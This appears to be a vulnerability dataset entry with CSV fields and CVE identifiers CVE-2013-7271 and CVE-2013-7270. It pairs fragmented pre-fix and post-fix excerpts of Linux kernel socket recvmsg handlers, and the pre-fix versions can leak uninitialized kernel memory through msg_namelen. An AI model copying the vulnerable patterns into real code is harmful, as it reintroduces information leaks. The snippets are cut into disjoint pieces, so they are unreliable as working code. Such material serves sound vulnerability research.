		sin6->sin6_scope_id = ipv6_iface_scope_id(&sin6->sin6_addr,
 IP6CB(skb)->iif);
		*addr_len = sizeof(*sin6);

 if (inet6_sk(sk)->rxopt.all)
			pingv6_ops.ip6_datagram_recv_ctl(sk, msg, skb);
 if (flags & MSG_OOB)
 goto out;




 if (flags & MSG_ERRQUEUE) {
		err = ip_recv_error(sk, msg, len);
 goto out;
 sin->sin_addr.s_addr = ip_hdr(skb)->saddr;
 sin->sin_port = 0;
 memset(&sin->sin_zero, 0, sizeof(sin->sin_zero));
		*addr_len = sizeof(*sin);
	}
 if (inet->cmsg_flags)
 ip_cmsg_recv(msg, skb);
 int is_udplite = IS_UDPLITE(sk);
 bool slow;







 if (flags & MSG_ERRQUEUE)
 return ip_recv_error(sk, msg, len);

 sin->sin_port = udp_hdr(skb)->source;
 sin->sin_addr.s_addr = ip_hdr(skb)->saddr;
 memset(sin->sin_zero, 0, sizeof(sin->sin_zero));
		*addr_len = sizeof(*sin);
	}
 if (inet->cmsg_flags)
 ip_cmsg_recv(msg, skb);
 if (flags & MSG_OOB)
 return -EOPNOTSUPP;




 if (flags & MSG_ERRQUEUE)
 return ipv6_recv_error(sk, msg, len);

		sin6->sin6_flowinfo = 0;
		sin6->sin6_scope_id = ipv6_iface_scope_id(&sin6->sin6_addr,
 IP6CB(skb)->iif);
		*addr_len = sizeof(*sin6);
	}

 sock_recv_ts_and_drops(msg, sk, skb);
 int is_udp4;
 bool slow;




 if (flags & MSG_ERRQUEUE)
 return ipv6_recv_error(sk, msg, len);

 ipv6_iface_scope_id(&sin6->sin6_addr,
 IP6CB(skb)->iif);
		}
		*addr_len = sizeof(*sin6);
	}
 if (is_udp4) {
 if (inet->cmsg_flags)
 if (flags & MSG_OOB)
 goto out;




	skb = skb_recv_datagram(sk, flags, noblock, &err);
 if (!skb)
 goto out;
 sin->sin_addr.s_addr = ip_hdr(skb)->saddr;
 sin->sin_port = 0;
 memset(&sin->sin_zero, 0, sizeof(sin->sin_zero));
		*addr_len = sizeof(*sin);
	}
 if (inet->cmsg_flags)
 ip_cmsg_recv(msg, skb);
			MSG_CMSG_COMPAT))
 goto out_nofree;




	skb = skb_recv_datagram(sk, flags, noblock, &rval);
 if (skb == NULL)
 goto out_nofree;

	rval = (flags & MSG_TRUNC) ? skb->len : copylen;

 if (msg->msg_name != NULL) {
 memcpy(msg->msg_name, &sa, sizeof(sa));
		*addr_len = sizeof(sa);
	}

out:
 skb_free_datagram(sk, skb);
"
2014,#NAME?,CVE-2013-7271," else if (len < ds)
		msg->msg_flags |= MSG_TRUNC;

	msg->msg_namelen = 0;

 lock_sock(sk);
 if (ctx->more) {
		ctx->more = 0;
 long copied = 0;

 lock_sock(sk);
	msg->msg_namelen = 0;
 for (iov = msg->msg_iov, iovlen = msg->msg_iovlen; iovlen > 0;
	     iovlen--, iov++) {
 unsigned long seglen = iov->iov_len;
{
 struct sk_buff		*skb;
 struct sock		*sk = sock->sk;
 struct sockaddr_mISDN	*maddr;

 int		copied, err;

 if (!skb)
 return err;

 if (msg->msg_namelen >= sizeof(struct sockaddr_mISDN)) {
 msg->msg_namelen = sizeof(struct sockaddr_mISDN);
		maddr = (struct sockaddr_mISDN *)msg->msg_name;
		maddr->family = AF_ISDN;
		maddr->dev = _pms(sk)->dev->id;
 if ((sk->sk_protocol == ISDN_P_LAPD_TE) ||
			maddr->sapi = _pms(sk)->ch.addr & 0xFF;
			maddr->tei =  (_pms(sk)->ch.addr >> 8) & 0xFF;
		}
	} else {
 if (msg->msg_namelen)
 printk(KERN_WARNING ""%s: too small namelen %d\n"",
			       __func__, msg->msg_namelen);
		msg->msg_namelen = 0;
	}

	copied = skb->len + MISDN_HEADER_LEN;
 if (error < 0)
 goto end;

	m->msg_namelen = 0;

 if (skb) {
		total_len = min_t(size_t, total_len, skb->len);
		error = skb_copy_datagram_iovec(skb, 0, m->msg_iov, total_len);
#endif
 int		(*sendmsg)   (struct kiocb *iocb, struct socket *sock,
 struct msghdr *m, size_t total_len);








 int		(*recvmsg)   (struct kiocb *iocb, struct socket *sock,
 struct msghdr *m, size_t total_len,
 int flags);
 size_t size, int flags)
{
 struct sock *sk = sock->sk;
 struct sockaddr_at *sat = (struct sockaddr_at *)msg->msg_name;
 struct ddpehdr *ddp;
 int copied = 0;
 int offset = 0;
	}
	err = skb_copy_datagram_iovec(skb, offset, msg->msg_iov, copied);

 if (!err) {
 if (sat) {
			sat->sat_family      = AF_APPLETALK;
			sat->sat_port        = ddp->deh_sport;
			sat->sat_addr.s_node = ddp->deh_snode;
			sat->sat_addr.s_net  = ddp->deh_snet;
		}
		msg->msg_namelen = sizeof(*sat);
	}

 skb_free_datagram(sk, skb);	/* Free the datagram. */
 struct sk_buff *skb;
 int copied, error = -EINVAL;

	msg->msg_namelen = 0;

 if (sock->state != SS_CONNECTED)
 return -ENOTCONN;


 skb_copy_datagram_iovec(skb, 0, msg->msg_iov, copied);

 if (msg->msg_namelen != 0) {
 struct sockaddr_ax25 *sax = (struct sockaddr_ax25 *)msg->msg_name;
		ax25_digi digi;
		ax25_address src;
 const unsigned char *mac = skb_mac_header(skb);


 memset(sax, 0, sizeof(struct full_sockaddr_ax25));
 ax25_addr_parse(mac + 1, skb->data - mac - 1, &src, NULL,

	skb = skb_recv_datagram(sk, flags, noblock, &err);
 if (!skb) {
 if (sk->sk_shutdown & RCV_SHUTDOWN) {
			msg->msg_namelen = 0;
 return 0;
		}
 return err;
	}

 if (bt_sk(sk)->skb_msg_name)
 bt_sk(sk)->skb_msg_name(skb, msg->msg_name,
						&msg->msg_namelen);
 else
			msg->msg_namelen = 0;
	}

 skb_free_datagram(sk, skb);
 if (flags & MSG_OOB)
 return -EOPNOTSUPP;

	msg->msg_namelen = 0;

 BT_DBG(""sk %p size %zu"", sk, size);

 lock_sock(sk);
 if (!skb)
 return err;

	msg->msg_namelen = 0;

	copied = skb->len;
 if (len < copied) {
		msg->msg_flags |= MSG_TRUNC;

 if (test_and_clear_bit(RFCOMM_DEFER_SETUP, &d->flags)) {
 rfcomm_dlc_accept(d);
		msg->msg_namelen = 0;
 return 0;
	}

 test_bit(BT_SK_DEFER_SETUP, &bt_sk(sk)->flags)) {
 sco_conn_defer_accept(pi->conn->hcon, pi->setting);
		sk->sk_state = BT_CONFIG;
		msg->msg_namelen = 0;

 release_sock(sk);
 return 0;
 if (m->msg_flags&MSG_OOB)
 goto read_error;

	m->msg_namelen = 0;

	skb = skb_recv_datagram(sk, flags, 0 , &ret);
 if (!skb)
 goto read_error;
 if (flags&MSG_OOB)
 goto out;

	msg->msg_namelen = 0;

 /*
	 * Lock the socket to prevent queue disordering
	 * while sleeps in memcpy_tomsg
 if (err < 0)
 return err;
		}
		kern_msg->msg_name = kern_address;

	} else
		kern_msg->msg_name = NULL;

 if (err < 0)
 return err;
		}
		m->msg_name = address;

	} else {
		m->msg_name = NULL;
	}
 if (skb->tstamp.tv64)
		sk->sk_stamp = skb->tstamp;

	msg->msg_namelen = sizeof(*sipx);

 if (sipx) {
		sipx->sipx_family	= AF_IPX;
		sipx->sipx_port		= ipx->ipx_source.sock;
 memcpy(sipx->sipx_node, ipx->ipx_source.node, IPX_NODE_LEN);
		sipx->sipx_network	= IPX_SKB_CB(skb)->ipx_source_net;
		sipx->sipx_type 	= ipx->ipx_type;
		sipx->sipx_zero		= 0;

	}
	rc = copied;


 IRDA_DEBUG(4, ""%s()\n"", __func__);

	msg->msg_namelen = 0;

	skb = skb_recv_datagram(sk, flags & ~MSG_DONTWAIT,
				flags & MSG_DONTWAIT, &err);
 if (!skb)
	target = sock_rcvlowat(sk, flags & MSG_WAITALL, size);
	timeo = sock_rcvtimeo(sk, noblock);

	msg->msg_namelen = 0;

 do {
 int chunk;
 struct sk_buff *skb = skb_dequeue(&sk->sk_receive_queue);
 int err = 0;
	u32 offset;

	msg->msg_namelen = 0;

 if ((sk->sk_state == IUCV_DISCONN) &&
 skb_queue_empty(&iucv->backlog_skb_q) &&
 skb_queue_empty(&sk->sk_receive_queue) &&
 if (flags & ~(MSG_PEEK|MSG_DONTWAIT|MSG_TRUNC|MSG_CMSG_COMPAT))
 goto out;

	msg->msg_namelen = 0;
	skb = skb_recv_datagram(sk, flags, flags & MSG_DONTWAIT, &err);
 if (skb == NULL)
 goto out;
 if (sk->sk_state & PPPOX_BOUND)
 goto end;

	msg->msg_namelen = 0;

	err = 0;
	skb = skb_recv_datagram(sk, flags & ~MSG_DONTWAIT,
				flags & MSG_DONTWAIT, &err);
 int target;	/* Read at least this many bytes */
 long timeo;

	msg->msg_namelen = 0;

 lock_sock(sk);
	copied = -ENOTCONN;
 if (unlikely(sk->sk_type == SOCK_STREAM && sk->sk_state == TCP_LISTEN))
	}
#endif

	msg->msg_namelen = 0;

	copied = data_skb->len;
 if (len < copied) {
		msg->msg_flags |= MSG_TRUNC;
		sax->sax25_family = AF_NETROM;
 skb_copy_from_linear_data_offset(skb, 7, sax->sax25_call.ax25_call,
			      AX25_ADDR_LEN);

	}

	msg->msg_namelen = sizeof(*sax);

 skb_free_datagram(sk, skb);

 release_sock(sk);

 pr_debug(""%p %zu\n"", sk, len);

	msg->msg_namelen = 0;

 lock_sock(sk);

 if (sk->sk_state == LLCP_CLOSED &&
 if (!skb)
 return rc;

	msg->msg_namelen = 0;

	copied = skb->len;
 if (len < copied) {
		msg->msg_flags |= MSG_TRUNC;
 struct sock *sk = sock->sk;
 struct sk_buff *skb;
 int copied, err;
 struct sockaddr_ll *sll;
 int vnet_hdr_len = 0;

	err = -EINVAL;
 goto out_free;
	}

 /*
	 *	If the address length field is there to be filled in, we fill
	 *	it in now.
 */

	sll = &PACKET_SKB_CB(skb)->sa.ll;
 if (sock->type == SOCK_PACKET)
		msg->msg_namelen = sizeof(struct sockaddr_pkt);
 else
		msg->msg_namelen = sll->sll_halen + offsetof(struct sockaddr_ll, sll_addr);

 /*
	 *	You lose any data beyond the buffer you gave. If it worries a
	 *	user program they can ask the device for its MTU anyway.
 */

	copied = skb->len;
 if (copied > len) {
		copied = len;

 sock_recv_ts_and_drops(msg, sk, skb);

 if (msg->msg_name)










 memcpy(msg->msg_name, &PACKET_SKB_CB(skb)->sa,
		       msg->msg_namelen);


 if (pkt_sk(sk)->auxdata) {
 struct tpacket_auxdata aux;

 rdsdebug(""size %zu flags 0x%x timeo %ld\n"", size, msg_flags, timeo);

	msg->msg_namelen = 0;

 if (msg_flags & MSG_OOB)
 goto out;

"," else if (len < ds)
		msg->msg_flags |= MSG_TRUNC;



 lock_sock(sk);
 if (ctx->more) {
		ctx->more = 0;
 long copied = 0;

 lock_sock(sk);

 for (iov = msg->msg_iov, iovlen = msg->msg_iovlen; iovlen > 0;
	     iovlen--, iov++) {
 unsigned long seglen = iov->iov_len;
{
 struct sk_buff		*skb;
 struct sock		*sk = sock->sk;


 int		copied, err;

 if (!skb)
 return err;

 if (msg->msg_name) {
 struct sockaddr_mISDN *maddr = msg->msg_name;

		maddr->family = AF_ISDN;
		maddr->dev = _pms(sk)->dev->id;
 if ((sk->sk_protocol == ISDN_P_LAPD_TE) ||
			maddr->sapi = _pms(sk)->ch.addr & 0xFF;
			maddr->tei =  (_pms(sk)->ch.addr >> 8) & 0xFF;
		}
		msg->msg_namelen = sizeof(*maddr);




	}

	copied = skb->len + MISDN_HEADER_LEN;
 if (error < 0)
 goto end;



 if (skb) {
		total_len = min_t(size_t, total_len, skb->len);
		error = skb_copy_datagram_iovec(skb, 0, m->msg_iov, total_len);
#endif
 int		(*sendmsg)   (struct kiocb *iocb, struct socket *sock,
 struct msghdr *m, size_t total_len);
 /* Notes for implementing recvmsg:
	 * ===============================
	 * msg->msg_namelen should get updated by the recvmsg handlers
	 * iff msg_name != NULL. It is by default 0 to prevent
	 * returning uninitialized memory to user space.  The recvfrom
	 * handlers can assume that msg.msg_name is either NULL or has
	 * a minimum size of sizeof(struct sockaddr_storage).
 */
 int		(*recvmsg)   (struct kiocb *iocb, struct socket *sock,
 struct msghdr *m, size_t total_len,
 int flags);
 size_t size, int flags)
{
 struct sock *sk = sock->sk;

 struct ddpehdr *ddp;
 int copied = 0;
 int offset = 0;
	}
	err = skb_copy_datagram_iovec(skb, offset, msg->msg_iov, copied);

 if (!err && msg->msg_name) {
 struct sockaddr_at *sat = msg->msg_name;
		sat->sat_family      = AF_APPLETALK;
		sat->sat_port        = ddp->deh_sport;
		sat->sat_addr.s_node = ddp->deh_snode;
		sat->sat_addr.s_net  = ddp->deh_snet;
		msg->msg_namelen     = sizeof(*sat);

	}

 skb_free_datagram(sk, skb);	/* Free the datagram. */
 struct sk_buff *skb;
 int copied, error = -EINVAL;



 if (sock->state != SS_CONNECTED)
 return -ENOTCONN;


 skb_copy_datagram_iovec(skb, 0, msg->msg_iov, copied);

 if (msg->msg_name) {

		ax25_digi digi;
		ax25_address src;
 const unsigned char *mac = skb_mac_header(skb);
 struct sockaddr_ax25 *sax = msg->msg_name;

 memset(sax, 0, sizeof(struct full_sockaddr_ax25));
 ax25_addr_parse(mac + 1, skb->data - mac - 1, &src, NULL,

	skb = skb_recv_datagram(sk, flags, noblock, &err);
 if (!skb) {
 if (sk->sk_shutdown & RCV_SHUTDOWN)

 return 0;

 return err;
	}

 if (bt_sk(sk)->skb_msg_name)
 bt_sk(sk)->skb_msg_name(skb, msg->msg_name,
						&msg->msg_namelen);


	}

 skb_free_datagram(sk, skb);
 if (flags & MSG_OOB)
 return -EOPNOTSUPP;



 BT_DBG(""sk %p size %zu"", sk, size);

 lock_sock(sk);
 if (!skb)
 return err;



	copied = skb->len;
 if (len < copied) {
		msg->msg_flags |= MSG_TRUNC;

 if (test_and_clear_bit(RFCOMM_DEFER_SETUP, &d->flags)) {
 rfcomm_dlc_accept(d);

 return 0;
	}

 test_bit(BT_SK_DEFER_SETUP, &bt_sk(sk)->flags)) {
 sco_conn_defer_accept(pi->conn->hcon, pi->setting);
		sk->sk_state = BT_CONFIG;


 release_sock(sk);
 return 0;
 if (m->msg_flags&MSG_OOB)
 goto read_error;



	skb = skb_recv_datagram(sk, flags, 0 , &ret);
 if (!skb)
 goto read_error;
 if (flags&MSG_OOB)
 goto out;



 /*
	 * Lock the socket to prevent queue disordering
	 * while sleeps in memcpy_tomsg
 if (err < 0)
 return err;
		}
 if (kern_msg->msg_name)
			kern_msg->msg_name = kern_address;
	} else
		kern_msg->msg_name = NULL;

 if (err < 0)
 return err;
		}
 if (m->msg_name)
			m->msg_name = address;
	} else {
		m->msg_name = NULL;
	}
 if (skb->tstamp.tv64)
		sk->sk_stamp = skb->tstamp;



 if (sipx) {
		sipx->sipx_family	= AF_IPX;
		sipx->sipx_port		= ipx->ipx_source.sock;
 memcpy(sipx->sipx_node, ipx->ipx_source.node, IPX_NODE_LEN);
		sipx->sipx_network	= IPX_SKB_CB(skb)->ipx_source_net;
		sipx->sipx_type 	= ipx->ipx_type;
		sipx->sipx_zero		= 0;
		msg->msg_namelen	= sizeof(*sipx);
	}
	rc = copied;


 IRDA_DEBUG(4, ""%s()\n"", __func__);



	skb = skb_recv_datagram(sk, flags & ~MSG_DONTWAIT,
				flags & MSG_DONTWAIT, &err);
 if (!skb)
	target = sock_rcvlowat(sk, flags & MSG_WAITALL, size);
	timeo = sock_rcvtimeo(sk, noblock);



 do {
 int chunk;
 struct sk_buff *skb = skb_dequeue(&sk->sk_receive_queue);
 int err = 0;
	u32 offset;



 if ((sk->sk_state == IUCV_DISCONN) &&
 skb_queue_empty(&iucv->backlog_skb_q) &&
 skb_queue_empty(&sk->sk_receive_queue) &&
 if (flags & ~(MSG_PEEK|MSG_DONTWAIT|MSG_TRUNC|MSG_CMSG_COMPAT))
 goto out;


	skb = skb_recv_datagram(sk, flags, flags & MSG_DONTWAIT, &err);
 if (skb == NULL)
 goto out;
 if (sk->sk_state & PPPOX_BOUND)
 goto end;



	err = 0;
	skb = skb_recv_datagram(sk, flags & ~MSG_DONTWAIT,
				flags & MSG_DONTWAIT, &err);
 int target;	/* Read at least this many bytes */
 long timeo;



 lock_sock(sk);
	copied = -ENOTCONN;
 if (unlikely(sk->sk_type == SOCK_STREAM && sk->sk_state == TCP_LISTEN))
	}
#endif



	copied = data_skb->len;
 if (len < copied) {
		msg->msg_flags |= MSG_TRUNC;
		sax->sax25_family = AF_NETROM;
 skb_copy_from_linear_data_offset(skb, 7, sax->sax25_call.ax25_call,
			      AX25_ADDR_LEN);
		msg->msg_namelen = sizeof(*sax);
	}



 skb_free_datagram(sk, skb);

 release_sock(sk);

 pr_debug(""%p %zu\n"", sk, len);



 lock_sock(sk);

 if (sk->sk_state == LLCP_CLOSED &&
 if (!skb)
 return rc;



	copied = skb->len;
 if (len < copied) {
		msg->msg_flags |= MSG_TRUNC;
 struct sock *sk = sock->sk;
 struct sk_buff *skb;
 int copied, err;

 int vnet_hdr_len = 0;

	err = -EINVAL;
 goto out_free;
	}

 /* You lose any data beyond the buffer you gave. If it worries
	 * a user program they can ask the device for its MTU
	 * anyway.











 */

	copied = skb->len;
 if (copied > len) {
		copied = len;

 sock_recv_ts_and_drops(msg, sk, skb);

 if (msg->msg_name) {
 /* If the address length field is there to be filled
		 * in, we fill it in now.
 */
 if (sock->type == SOCK_PACKET) {
			msg->msg_namelen = sizeof(struct sockaddr_pkt);
		} else {
 struct sockaddr_ll *sll = &PACKET_SKB_CB(skb)->sa.ll;
			msg->msg_namelen = sll->sll_halen +
 offsetof(struct sockaddr_ll, sll_addr);
		}
 memcpy(msg->msg_name, &PACKET_SKB_CB(skb)->sa,
		       msg->msg_namelen);
	}

 if (pkt_sk(sk)->auxdata) {
 struct tpacket_auxdata aux;

 rdsdebug(""size %zu flags 0x%x timeo %ld\n"", size, msg_flags, timeo);



 if (msg_flags & MSG_OOB)
 goto out;

"
2014,#NAME?,CVE-2013-7270," else if (len < ds)
		msg->msg_flags |= MSG_TRUNC;

	msg->msg_namelen = 0;

 lock_sock(sk);
 if (ctx->more) {
		ctx->more = 0;
 long copied = 0;

 lock_sock(sk);
	msg->msg_namelen = 0;
 for (iov = msg->msg_iov, iovlen = msg->msg_iovlen; iovlen > 0;
	     iovlen--, iov++) {
 unsigned long seglen = iov->iov_len;
{
 struct sk_buff		*skb;
 struct sock		*sk = sock->sk;
 struct sockaddr_mISDN	*maddr;

 int		copied, err;

 if (!skb)
 return err;

 if (msg->msg_namelen >= sizeof(struct sockaddr_mISDN)) {
 msg->msg_namelen = sizeof(struct sockaddr_mISDN);
		maddr = (struct sockaddr_mISDN *)msg->msg_name;
		maddr->family = AF_ISDN;
		maddr->dev = _pms(sk)->dev->id;
 if ((sk->sk_protocol == ISDN_P_LAPD_TE) ||
			maddr->sapi = _pms(sk)->ch.addr & 0xFF;
			maddr->tei =  (_pms(sk)->ch.addr >> 8) & 0xFF;
		}
	} else {
 if (msg->msg_namelen)
 printk(KERN_WARNING ""%s: too small namelen %d\n"",
			       __func__, msg->msg_namelen);
		msg->msg_namelen = 0;
	}

	copied = skb->len + MISDN_HEADER_LEN;
 if (error < 0)
 goto end;

	m->msg_namelen = 0;

 if (skb) {
		total_len = min_t(size_t, total_len, skb->len);
		error = skb_copy_datagram_iovec(skb, 0, m->msg_iov, total_len);
#endif
 int		(*sendmsg)   (struct kiocb *iocb, struct socket *sock,
 struct msghdr *m, size_t total_len);








 int		(*recvmsg)   (struct kiocb *iocb, struct socket *sock,
 struct msghdr *m, size_t total_len,
 int flags);
 size_t size, int flags)
{
 struct sock *sk = sock->sk;
 struct sockaddr_at *sat = (struct sockaddr_at *)msg->msg_name;
 struct ddpehdr *ddp;
 int copied = 0;
 int offset = 0;
	}
	err = skb_copy_datagram_iovec(skb, offset, msg->msg_iov, copied);

 if (!err) {
 if (sat) {
			sat->sat_family      = AF_APPLETALK;
			sat->sat_port        = ddp->deh_sport;
			sat->sat_addr.s_node = ddp->deh_snode;
			sat->sat_addr.s_net  = ddp->deh_snet;
		}
		msg->msg_namelen = sizeof(*sat);
	}

 skb_free_datagram(sk, skb);	/* Free the datagram. */
 struct sk_buff *skb;
 int copied, error = -EINVAL;

	msg->msg_namelen = 0;

 if (sock->state != SS_CONNECTED)
 return -ENOTCONN;


 skb_copy_datagram_iovec(skb, 0, msg->msg_iov, copied);

 if (msg->msg_namelen != 0) {
 struct sockaddr_ax25 *sax = (struct sockaddr_ax25 *)msg->msg_name;
		ax25_digi digi;
		ax25_address src;
 const unsigned char *mac = skb_mac_header(skb);


 memset(sax, 0, sizeof(struct full_sockaddr_ax25));
 ax25_addr_parse(mac + 1, skb->data - mac - 1, &src, NULL,

	skb = skb_recv_datagram(sk, flags, noblock, &err);
 if (!skb) {
 if (sk->sk_shutdown & RCV_SHUTDOWN) {
			msg->msg_namelen = 0;
 return 0;
		}
 return err;
	}

 if (bt_sk(sk)->skb_msg_name)
 bt_sk(sk)->skb_msg_name(skb, msg->msg_name,
						&msg->msg_namelen);
 else
			msg->msg_namelen = 0;
	}

 skb_free_datagram(sk, skb);
 if (flags & MSG_OOB)
 return -EOPNOTSUPP;

	msg->msg_namelen = 0;

 BT_DBG(""sk %p size %zu"", sk, size);

 lock_sock(sk);
 if (!skb)
 return err;

	msg->msg_namelen = 0;

	copied = skb->len;
 if (len < copied) {
		msg->msg_flags |= MSG_TRUNC;

 if (test_and_clear_bit(RFCOMM_DEFER_SETUP, &d->flags)) {
 rfcomm_dlc_accept(d);
		msg->msg_namelen = 0;
 return 0;
	}

 test_bit(BT_SK_DEFER_SETUP, &bt_sk(sk)->flags)) {
 sco_conn_defer_accept(pi->conn->hcon, pi->setting);
		sk->sk_state = BT_CONFIG;
		msg->msg_namelen = 0;

 release_sock(sk);
 return 0;
 if (m->msg_flags&MSG_OOB)
 goto read_error;

	m->msg_namelen = 0;

	skb = skb_recv_datagram(sk, flags, 0 , &ret);
 if (!skb)
 goto read_error;
 if (flags&MSG_OOB)
 goto out;

	msg->msg_namelen = 0;

 /*
	 * Lock the socket to prevent queue disordering
	 * while sleeps in memcpy_tomsg
 if (err < 0)
 return err;
		}
		kern_msg->msg_name = kern_address;

	} else
		kern_msg->msg_name = NULL;

 if (err < 0)
 return err;
		}
		m->msg_name = address;

	} else {
		m->msg_name = NULL;
	}
 if (skb->tstamp.tv64)
		sk->sk_stamp = skb->tstamp;

	msg->msg_namelen = sizeof(*sipx);

 if (sipx) {
		sipx->sipx_family	= AF_IPX;
		sipx->sipx_port		= ipx->ipx_source.sock;
 memcpy(sipx->sipx_node, ipx->ipx_source.node, IPX_NODE_LEN);
		sipx->sipx_network	= IPX_SKB_CB(skb)->ipx_source_net;
		sipx->sipx_type 	= ipx->ipx_type;
		sipx->sipx_zero		= 0;

	}
	rc = copied;


 IRDA_DEBUG(4, ""%s()\n"", __func__);

	msg->msg_namelen = 0;

	skb = skb_recv_datagram(sk, flags & ~MSG_DONTWAIT,
				flags & MSG_DONTWAIT, &err);
 if (!skb)
	target = sock_rcvlowat(sk, flags & MSG_WAITALL, size);
	timeo = sock_rcvtimeo(sk, noblock);

	msg->msg_namelen = 0;

 do {
 int chunk;
 struct sk_buff *skb = skb_dequeue(&sk->sk_receive_queue);
 int err = 0;
	u32 offset;

	msg->msg_namelen = 0;

 if ((sk->sk_state == IUCV_DISCONN) &&
 skb_queue_empty(&iucv->backlog_skb_q) &&
 skb_queue_empty(&sk->sk_receive_queue) &&
 if (flags & ~(MSG_PEEK|MSG_DONTWAIT|MSG_TRUNC|MSG_CMSG_COMPAT))
 goto out;

	msg->msg_namelen = 0;
	skb = skb_recv_datagram(sk, flags, flags & MSG_DONTWAIT, &err);
 if (skb == NULL)
 goto out;
 if (sk->sk_state & PPPOX_BOUND)
 goto end;

	msg->msg_namelen = 0;

	err = 0;
	skb = skb_recv_datagram(sk, flags & ~MSG_DONTWAIT,
				flags & MSG_DONTWAIT, &err);
 int target;	/* Read at least this many bytes */
 long timeo;

	msg->msg_namelen = 0;

 lock_sock(sk);
	copied = -ENOTCONN;
 if (unlikely(sk->sk_type == SOCK_STREAM && sk->sk_state == TCP_LISTEN))
	}
#endif

	msg->msg_namelen = 0;

	copied = data_skb->len;
 if (len < copied) {
		msg->msg_flags |= MSG_TRUNC;
		sax->sax25_family = AF_NETROM;
 skb_copy_from_linear_data_offset(skb, 7, sax->sax25_call.ax25_call,
			      AX25_ADDR_LEN);

	}

	msg->msg_namelen = sizeof(*sax);

 skb_free_datagram(sk, skb);

 release_sock(sk);

 pr_debug(""%p %zu\n"", sk, len);

	msg->msg_namelen = 0;

 lock_sock(sk);

 if (sk->sk_state == LLCP_CLOSED &&
 if (!skb)
 return rc;

	msg->msg_namelen = 0;

	copied = skb->len;
 if (len < copied) {
		msg->msg_flags |= MSG_TRUNC;
 struct sock *sk = sock->sk;
 struct sk_buff *skb;
 int copied, err;
 struct sockaddr_ll *sll;
 int vnet_hdr_len = 0;

	err = -EINVAL;
 goto out_free;
	}

 /*
	 *	If the address length field is there to be filled in, we fill
	 *	it in now.
 */

	sll = &PACKET_SKB_CB(skb)->sa.ll;
 if (sock->type == SOCK_PACKET)
		msg->msg_namelen = sizeof(struct sockaddr_pkt);
 else
		msg->msg_namelen = sll->sll_halen + offsetof(struct sockaddr_ll, sll_addr);

 /*
	 *	You lose any data beyond the buffer you gave. If it worries a
	 *	user program they can ask the device for its MTU anyway.
 */

	copied = skb->len;
 if (copied > len) {
		copied = len;

 sock_recv_ts_and_drops(msg, sk, skb);

 if (msg->msg_name)










 memcpy(msg->msg_name, &PACKET_SKB_CB(skb)->sa,
		       msg->msg_namelen);


 if (pkt_sk(sk)->auxdata) {
 struct tpacket_auxdata aux;

 rdsdebug(""size %zu flags 0x%x timeo %ld\n"", size, msg_flags, timeo);

	msg->msg_namelen = 0;

 if (msg_flags & MSG_OOB)
 goto out;

"," else if (len < ds)
		msg->msg_flags |= MSG_TRUNC;



 lock_sock(sk);
 if (ctx->more) {
		ctx->more = 0;
 long copied = 0;

 lock_sock(sk);

 for (iov = msg->msg_iov, iovlen = msg->msg_iovlen; iovlen > 0;
	     iovlen--, iov++) {
 unsigned long seglen = iov->iov_len;
{
 struct sk_buff		*skb;
 struct sock		*sk = sock->sk;


 int		copied, err;

 if (!skb)
 return err;

 if (msg->msg_name) {
 struct sockaddr_mISDN *maddr = msg->msg_name;

		maddr->family = AF_ISDN;
		maddr->dev = _pms(sk)->dev->id;
 if ((sk->sk_protocol == ISDN_P_LAPD_TE) ||
			maddr->sapi = _pms(sk)->ch.addr & 0xFF;
			maddr->tei =  (_pms(sk)->ch.addr >> 8) & 0xFF;
		}
		msg->msg_namelen = sizeof(*maddr);




	}

	copied = skb->len + MISDN_HEADER_LEN;
 if (error < 0)
 goto end;



 if (skb) {
		total_len = min_t(size_t, total_len, skb->len);
		error = skb_copy_datagram_iovec(skb, 0, m->msg_iov, total_len);
#endif
 int		(*sendmsg)   (struct kiocb *iocb, struct socket *sock,
 struct msghdr *m, size_t total_len);
 /* Notes for implementing recvmsg:
	 * ===============================
	 * msg->msg_namelen should get updated by the recvmsg handlers
	 * iff msg_name != NULL. It is by default 0 to prevent
	 * returning uninitialized memory to user space.  The recvfrom
	 * handlers can assume that msg.msg_name is either NULL or has
	 * a minimum size of sizeof(struct sockaddr_storage).
 */
 int		(*recvmsg)   (struct kiocb *iocb, struct socket *sock,
 struct msghdr *m, size_t total_len,
 int flags);
 size_t size, int flags)
{
 struct sock *sk = sock->sk;

 struct ddpehdr *ddp;
 int copied = 0;
 int offset = 0;
	}
	err = skb_copy_datagram_iovec(skb, offset, msg->msg_iov, copied);

 if (!err && msg->msg_name) {
 struct sockaddr_at *sat = msg->msg_name;
		sat->sat_family      = AF_APPLETALK;
		sat->sat_port        = ddp->deh_sport;
		sat->sat_addr.s_node = ddp->deh_snode;
		sat->sat_addr.s_net  = ddp->deh_snet;
		msg->msg_namelen     = sizeof(*sat);

	}

 skb_free_datagram(sk, skb);	/* Free the datagram. */
 struct sk_buff *skb;
 int copied, error = -EINVAL;



 if (sock->state != SS_CONNECTED)
 return -ENOTCONN;


 skb_copy_datagram_iovec(skb, 0, msg->msg_iov, copied);

 if (msg->msg_name) {

		ax25_digi digi;
		ax25_address src;
 const unsigned char *mac = skb_mac_header(skb);
 struct sockaddr_ax25 *sax = msg->msg_name;

 memset(sax, 0, sizeof(struct full_sockaddr_ax25));
 ax25_addr_parse(mac + 1, skb->data - mac - 1, &src, NULL,

	skb = skb_recv_datagram(sk, flags, noblock, &err);
 if (!skb) {
 if (sk->sk_shutdown & RCV_SHUTDOWN)

 return 0;

 return err;
	}

 if (bt_sk(sk)->skb_msg_name)
 bt_sk(sk)->skb_msg_name(skb, msg->msg_name,
						&msg->msg_namelen);


	}

 skb_free_datagram(sk, skb);
 if (flags & MSG_OOB)
 return -EOPNOTSUPP;



 BT_DBG(""sk %p size %zu"", sk, size);

 lock_sock(sk);
 if (!skb)
 return err;



	copied = skb->len;
 if (len < copied) {
		msg->msg_flags |= MSG_TRUNC;

 if (test_and_clear_bit(RFCOMM_DEFER_SETUP, &d->flags)) {
 rfcomm_dlc_accept(d);

 return 0;
	}

 test_bit(BT_SK_DEFER_SETUP, &bt_sk(sk)->flags)) {
 sco_conn_defer_accept(pi->conn->hcon, pi->setting);
		sk->sk_state = BT_CONFIG;


 release_sock(sk);
 return 0;
 if (m->msg_flags&MSG_OOB)
 goto read_error;



	skb = skb_recv_datagram(sk, flags, 0 , &ret);
 if (!skb)
 goto read_error;
 if (flags&MSG_OOB)
 goto out;



 /*
	 * Lock the socket to prevent queue disordering
	 * while sleeps in memcpy_tomsg
 if (err < 0)
 return err;
		}
 if (kern_msg->msg_name)
			kern_msg->msg_name = kern_address;
	} else
		kern_msg->msg_name = NULL;

 if (err < 0)
 return err;
		}
 if (m->msg_name)
